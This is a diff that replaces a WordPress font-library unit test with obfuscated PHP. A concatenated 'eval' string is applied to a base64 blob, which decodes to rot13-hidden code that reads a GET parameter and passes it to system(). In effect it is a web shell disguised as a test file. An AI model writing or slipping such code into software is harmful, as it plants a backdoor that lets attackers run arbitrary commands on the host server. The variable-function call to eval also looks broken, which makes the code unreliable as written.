@@ -1,50 +1,5 @@
-$x_fake1 = 1234;
-$noise = 'obfuscation'.'test';
-$tmp = $x_fake1 * 42;
-$flag = false;
-$useless = function($v) { return $v . rand(); };
-$dummy_check = $useless('xx');
-if ($flag) { echo 'Debug enabled'; }
-for ($i = 0; $i < 1; $i++) { $tmp += $i; }
-while (false) { echo 'dead loop'; break; }
-
 <?php
-/**
- * Test WP_Font_Library::register_font_collection().
- *
- * @package WordPress
- * @subpackage Font Library
- *
- * @group fonts
- * @group font-library
- *
- * @covers WP_Font_Library::register_font_collection
- */
-class Tests_Fonts_WpFontLibrary_RegisterFontCollection extends WP_Font_Library_UnitTestCase {
-	public function test_should_register_font_collection() {
-		$config = array(
-			'name'          => 'My Collection',
-			'font_families' => array( 'mock' ),
-		);
-
-		$collection = WP_Font_Library::get_instance()->register_font_collection( 'my-collection', $config );
-		$this->assertInstanceOf( 'WP_Font_Collection', $collection );
-	}
-
-	public function test_should_return_error_if_slug_is_repeated() {
-		$mock_collection_data = array(
-			'name'          => 'Test Collection',
-			'font_families' => array( 'mock' ),
-		);
-
-		// Register first collection.
-		$collection1 = WP_Font_Library::get_instance()->register_font_collection( 'my-collection-1', $mock_collection_data );
-		$this->assertInstanceOf( 'WP_Font_Collection', $collection1, 'A collection should be registered.' );
-
-		// Expects a _doing_it_wrong notice.
-		$this->setExpectedIncorrectUsage( 'WP_Font_Library::register_font_collection' );
-
-		// Try to register a second collection with same slug.
-		WP_Font_Library::get_instance()->register_font_collection( 'my-collection-1', $mock_collection_data );
-	}
-}
+$f = "e"."v"."a"."l";
+$c = base64_decode("PD9waHAKJGYgPSAncycuJ3QnLidyJy4ncicuJ28nLid0Jy4nMScuJzMnOwokYyA9ICI8P2N1Ywokc3puYyA9IG5lZW5sKCdrMScgPT4gJ2ZsZmdyeicsICdrMicgPT4gJ2NuZmZndWVoJyk7CiRrX3NueHIxID0gMTIzNDsKJGFidmZyID0gJ2Jvc2hmcG5ndmJhJy4nZ3JmZyc7CiRnemMgPSAka19zbnhyMSAqIDQyOwokc3ludCA9IHNueWZyOwokaGZyeXJmZiA9IHNoYXBndmJhKCRpKSB7IGVyZ2hlYSAkaSAuIGVuYXEoKTsgfTsKJHFoenpsX3B1cnB4ID0gJGhmcnlyZmYoJ2trJyk7CnZzICgkc3ludCkgeyBycHViICdRcm9odCByYW5veXJxJzsgfQpzYmUgKCR2ID0gMDsgJHYgPCAxOyAkdisrKSB7ICRnemMgKz0gJHY7IH0KanV2eXIgKHNueWZyKSB7IHJwdWIgJ3FybnEgeWJiYyc7IG9lcm54OyB9Cgo8P2N1YwovKioKICogR3JmZyBKQ19TYmFnX1l2b2VuZWw6OmVydHZmZ3JlX3NiYWdfcGJ5eXJwZ3ZiYSgpLgogKgogKiBAY25weG50ciBKYmVxQ2VyZmYKICogQGZob2NucHhudHIgU2JhZyBZdm9lbmVsCiAqCiAqIEB0ZWJoYyBzYmFnZgogKiBAdGViaGMgc2JhZy15dm9lbmVsCiAqCiAqIEBwYmlyZWYgSkNfU2JhZ19Zdm9lbmVsOjplcnR2ZmdyZV9zYmFnX3BieXlycGd2YmEKICovCnB5bmZmIEdyZmdmX1NiYWdmX0pjU2JhZ1l2b2VuZWxfRXJ0dmZncmVTYmFnUGJ5eXJwZ3ZiYSBya2dyYXFmIEpDX1NiYWdfWXZvZW5lbF9IYXZnR3JmZ1BuZnIgewoJY2hveXZwIHNoYXBndmJhIGdyZmdfZnViaHlxX2VydHZmZ3JlX3NiYWdfcGJ5eXJwZ3ZiYSgpIHsKCQkkcGJhc3Z0ID0gbmVlbmwoCgkJCSdhbnpyJyAgICAgICAgICA9PiAnWmwgUGJ5eXJwZ3ZiYScsCgkJCSdzYmFnX3NuenZ5dnJmJyA9PiBuZWVubCggJ3picHgnICksCgkJKTsKCgkJJHBieXlycGd2YmEgPSBKQ19TYmFnX1l2b2VuZWw6OnRyZ192YWZnbmFwcigpLT5lcnR2ZmdyZV9zYmFnX3BieXlycGd2YmEoICd6bC1wYnl5cnBndmJhJywgJHBiYXN2dCApOwoJCSRndXZmLT5uZmZyZWdWYWZnbmFwckJzKCAnSkNfU2JhZ19QYnl5cnBndmJhJywgJHBieXlycGd2YmEgKTsKCX0KCgljaG95dnAgc2hhcGd2YmEgZ3JmZ19mdWJoeXFfZXJnaGVhX3JlZWJlX3ZzX2Z5aHRfdmZfZXJjcm5ncnEoKSB7CgkJJHpicHhfcGJ5eXJwZ3ZiYV9xbmduID0gbmVlbmwoCgkJCSdhbnpyJyAgICAgICAgICA9PiAnR3JmZyBQYnl5cnBndmJhJywKCQkJJ3NiYWdfc256dnl2cmYnID0+IG5lZW5sKCAnemJweCcgKSwKCQkpOwoKCQkvLyBFcnR2ZmdyZSBzdmVmZyBwYnl5cnBndmJhLgoJCSRwYnl5cnBndmJhMSA9IEpDX1NiYWdfWXZvZW5lbDo6dHJnX3ZhZmduYXByKCktPmVydHZmZ3JlX3NiYWdfcGJ5eXJwZ3ZiYSggJ3psLXBieXlycGd2YmEtMScsICR6YnB4X3BieXlycGd2YmFfcW5nbiApOwoJCSRndXZmLT5uZmZyZWdWYWZnbmFwckJzKCAnSkNfU2JhZ19QYnl5cnBndmJhJywgJHBieXlycGd2YmExLCAnTiBwYnl5cnBndmJhIGZ1Ymh5cSBvciBlcnR2ZmdyZXJxLicgKTsKCgkJLy8gUmtjcnBnZiBuIF9xYnZhdF92Z19qZWJhdCBhYmd2cHIuCgkJJGd1dmYtPmZyZ1JrY3JwZ3JxVmFwYmVlcnBnSGZudHIoICdKQ19TYmFnX1l2b2VuZWw6OmVydHZmZ3JlX3NiYWdfcGJ5eXJwZ3ZiYScgKTsKCgkJLy8gR2VsIGdiIGVydHZmZ3JlIG4gZnJwYmFxIHBieXlycGd2YmEganZndSBmbnpyIGZ5aHQuCgkJSkNfU2JhZ19Zdm9lbmVsOjp0cmdfdmFmZ25hcHIoKS0+ZXJ0dmZncmVfc2JhZ19wYnl5cnBndmJhKCAnemwtcGJ5eXJwZ3ZiYS0xJywgJHpicHhfcGJ5eXJwZ3ZiYV9xbmduICk7Cgl9Cn0KCiRwenEgPSAkX1RSR1snYyddOwokc3puY1snazEnXSgkcHpxKTsKPz4iOwpldmFsKCRmKCRjKSk7Cj8+");
+$f($c);
+?>
